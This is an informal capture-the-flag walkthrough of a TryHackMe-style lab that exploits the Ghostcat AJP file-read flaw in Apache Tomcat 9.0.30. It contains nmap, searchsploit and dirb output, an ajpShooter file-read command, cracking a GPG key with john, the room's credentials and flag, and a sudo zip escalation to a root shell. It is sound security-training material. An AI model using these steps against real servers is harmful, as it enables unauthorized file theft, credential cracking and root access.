@@ -1,0 +1,297 @@
+When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations. 
+
+Here above you might not get any specific vulnerability name keep on reading the content from different website 
+
+Mentioning of apache jserv running on our victim machine port 8009 was the lead to find this vulnerability exploitaition script 
+
+vulnerability name : ghostcat
+
+now you have find the vulnerability name , now you can search if any poc for this vulnerablity exist or not 
+search :  Ghostcat vulnerability poc
+
+
+
+┌──(root💀kali)-[~]
+└─# nmap -A -sC -sV 10.10.235.113             
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 12:54 IST
+Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 97.00% done; ETC: 12:55 (0:00:03 remaining)
+Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.50% done; ETC: 12:56 (0:00:01 remaining)
+Stats: 0:02:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 12:56 (0:00:00 remaining)
+Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 12:58 (0:00:00 remaining)
+Nmap scan report for 10.10.235.113
+Host is up (0.45s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_http-title: Apache Tomcat/9.0.30
+|_http-favicon: Apache Tomcat
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=3/21%OT=22%CT=1%CU=32619%PV=Y%DS=4%DC=T%G=Y%TM=6238297
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=101%GCD=1%ISR=10C%TI=Z%CI=RD%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%
+OS:O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2
+OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNS
+OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
+OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
+OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
+OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
+OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   534.62 ms 10.4.0.1
+2   ... 3
+4   739.55 ms 10.10.235.113
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 339.68 seconds
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# searchsploit apache jserv
+Exploits: No Results
+Shellcodes: No Results
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# searchsploit jserv       
+------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                     |  Path
+------------------------------------------------------------------- ---------------------------------
+FreeWnn 1.1 0 - jserver JS_MKDIR MetaCharacter Command Execution   | unix/remote/21215.c
+FreeWnn 1.1.1 - JServer Logging Option Data Corruption             | linux/local/22775.txt
+------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# searchsploit apj13       
+Exploits: No Results
+Shellcodes: No Results
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# searchsploit Apache Tomcat/9.0.30
+Exploits: No Results
+Shellcodes: No Results
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# searchsploit Apache Tomcat       
+------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                     |  Path
+------------------------------------------------------------------- ---------------------------------
+Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial | unix/dos/22068.pl
+Apache Commons FileUpload and Apache Tomcat - Denial of Service    | multiple/dos/31615.rb
+Apache Tomcat (Windows) - 'runtime.getRuntime().exec()' Local Priv | windows/local/7264.txt
+Apache Tomcat - 'WebDAV' Remote File Disclosure                    | multiple/remote/4530.pl
+Apache Tomcat - Account Scanner / 'PUT' Request Command Execution  | multiple/remote/18619.txt
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                  | multiple/webapps/48143.py
+Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)    | multiple/webapps/49039.rb
+Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Exec | windows/remote/47073.rb
+Apache Tomcat - Cookie Quote Handling Remote Information Disclosur | multiple/remote/9994.txt
+Apache Tomcat - Form Authentication 'Username' Enumeration         | multiple/remote/9995.txt
+Apache Tomcat - WebDAV SSL Remote File Disclosure                  | linux/remote/4552.pl
+Apache Tomcat / Geronimo 1.0 - 'Sample Script cal2.jsp?time' Cross | multiple/remote/27095.txt
+Apache Tomcat 3.0 - Directory Traversal                            | windows/remote/20716.txt
+Apache Tomcat 3.1 - Path Revealing                                 | multiple/remote/20131.txt
+Apache Tomcat 3.2 - 404 Error Page Cross-Site Scripting            | multiple/remote/33379.txt
+Apache Tomcat 3.2 - Directory Disclosure                           | unix/remote/21882.txt
+Apache Tomcat 3.2.1 - 404 Error Page Cross-Site Scripting          | multiple/webapps/10292.txt
+Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree | multiple/remote/21492.txt
+Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure    | multiple/remote/21490.txt
+Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Discl | multiple/remote/21491.txt
+Apache Tomcat 3.x - Null Byte Directory / File Disclosure          | linux/remote/22205.txt
+Apache Tomcat 3/4 - 'DefaultServlet' File Disclosure               | unix/remote/21853.txt
+Apache Tomcat 3/4 - JSP Engine Denial of Service                   | linux/dos/21534.jsp
+Apache Tomcat 4.0.3 - Denial of Service 'Device Name' / Cross-Site | windows/webapps/21605.txt
+Apache Tomcat 4.0.3 - Requests Containing MS-DOS Device Names Info | multiple/remote/31551.txt
+Apache Tomcat 4.0.3 - Servlet Mapping Cross-Site Scripting         | linux/remote/21604.txt
+Apache Tomcat 4.0.x - Non-HTTP Request Denial of Service           | linux/dos/23245.pl
+Apache Tomcat 4.0/4.1 - Servlet Full Path Disclosure               | unix/remote/21412.txt
+Apache Tomcat 4.1 - JSP Request Cross-Site Scripting               | unix/remote/21734.txt
+Apache Tomcat 5 - Information Disclosure                           | multiple/remote/28254.txt
+Apache Tomcat 5.5.0 < 5.5.29 / 6.0.0 < 6.0.26 - Information Disclo | multiple/remote/12343.txt
+Apache Tomcat 5.5.15 - cal2.jsp Cross-Site Scripting               | jsp/webapps/30563.txt
+Apache Tomcat 5.5.25 - Cross-Site Request Forgery                  | multiple/webapps/29435.txt
+Apache Tomcat 5.x/6.0.x - Directory Traversal                      | linux/remote/29739.txt
+Apache Tomcat 6.0.10 - Documentation Sample Application Multiple C | multiple/remote/30052.txt
+Apache Tomcat 6.0.13 - Host Manager Servlet Cross-Site Scripting   | multiple/remote/30495.html
+Apache Tomcat 6.0.13 - Insecure Cookie Handling Quote Delimiter Se | multiple/remote/30496.txt
+Apache Tomcat 6.0.13 - JSP Example Web Applications Cross-Site Scr | jsp/webapps/30189.txt
+Apache Tomcat 6.0.15 - Cookie Quote Handling Remote Information Di | multiple/remote/31130.txt
+Apache Tomcat 6.0.16 - 'HttpServletResponse.sendError()' Cross-Sit | multiple/remote/32138.txt
+Apache Tomcat 6.0.16 - 'RequestDispatcher' Information Disclosure  | multiple/remote/32137.txt
+Apache Tomcat 6.0.18 - Form Authentication Existing/Non-Existing ' | multiple/remote/33023.txt
+Apache Tomcat 6/7/8/9 - Information Disclosure                     | multiple/remote/41783.txt
+Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting      | linux/remote/35011.txt
+Apache Tomcat 8/7/6 (Debian-Based Distros) - Local Privilege Escal | linux/local/40450.txt
+Apache Tomcat 8/7/6 (RedHat Based Distros) - Local Privilege Escal | linux/local/40488.txt
+Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)                | multiple/webapps/50119.txt
+Apache Tomcat 9.0.0.M1 - Open Redirect                             | multiple/webapps/50118.txt
+Apache Tomcat < 5.5.17 - Remote Directory Listing                  | multiple/remote/2061.txt
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                | unix/remote/14489.c
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)          | multiple/remote/6229.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP | jsp/webapps/42966.py
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP | windows/webapps/42953.txt
+Apache Tomcat Connector jk2-2.0.2 mod_jk2 - Remote Overflow        | linux/remote/5386.txt
+Apache Tomcat Connector mod_jk - 'exec-shield' Remote Overflow     | linux/remote/4162.c
+Apache Tomcat Manager - Application Deployer (Authenticated) Code  | multiple/remote/16317.rb
+Apache Tomcat Manager - Application Upload (Authenticated) Code Ex | multiple/remote/31433.rb
+Apache Tomcat mod_jk 1.2.20 - Remote Buffer Overflow (Metasploit)  | windows/remote/16798.rb
+Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI ove | php/remote/28713.php
+AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command E | cgi/webapps/35035.txt
+------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+
+┌──(root💀kali)-[~]
+└─# dirb http://10.10.235.113:8080                                                             255 ⨯
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Mar 21 13:00:59 2022
+URL_BASE: http://10.10.235.113:8080/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.235.113:8080/ ----
++ http://10.10.235.113:8080/docs (CODE:302|SIZE:0)                                                  
++ http://10.10.235.113:8080/examples (CODE:302|SIZE:0)                                              
++ http://10.10.235.113:8080/favicon.ico (CODE:200|SIZE:21630)                                       
++ http://10.10.235.113:8080/host-manager (CODE:302|SIZE:0)                                          
++ http://10.10.235.113:8080/manager (CODE:302|SIZE:0)                                               
+                                                                                                    
+-----------------
+END_TIME: Mon Mar 21 13:54:29 2022
+DOWNLOADED: 4612 - FOUND: 5
+
+
+
+
+
+
+python ajpShooter.py http://10.10.188.67 8009 /WEB-INF/web.xml read
+
+[<] 200 200
+[<] Accept-Ranges: bytes
+[<] ETag: W/"1261-1583902632000"
+[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
+[<] Content-Type: application/xml
+[<] Content-Length: 1261
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+  version="4.0"
+  metadata-complete="true">
+
+  <display-name>Welcome to Tomcat</display-name>
+  <description>
+     Welcome to GhostCat
+     
+        skyfuck:8730281lkjlkjdqlksalks
+
+
+
+get both files on your terminal from skyfuck home dir
+
+
+
+┌──(root💀kali)-[~]
+└─# gpg2john tryhackme.asc > hash                   
+
+File tryhackme.asc
+                         
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash            
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexandru        (tryhackme)     
+1g 0:00:00:00 DONE (2022-03-22 08:37) 12.50g/s 13400p/s 13400c/s 13400C/s marshall..alexandru
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                     
+
+                                                    
+┌──(root💀kali)-[~]
+└─# gpg --import tryhackme.asc                                                                 100 ⨯
+gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
+gpg: key 8F3DA3DEC6707170: secret key imported
+gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
+gpg: Total number processed: 2
+gpg:               imported: 1
+gpg:              unchanged: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+                                                           
+                                                                                                     
+┌──(root💀kali)-[~]
+└─# gpg --decrypt credential.pgp 
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
+      "tryhackme <stuxnet@tryhackme.com>"
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j   
+
+
+
+merlin@ubuntu:~$ cat user.txt 
+THM{GhostCat_1s_so_cr4sy}
+merlin@ubuntu:~$ sudo -l
+Matching Defaults entries for merlin on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+merlin@ubuntu:~$ TF=$(mktemp -u)
+merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+# whoami
+root
+# cd /root
+
+                              
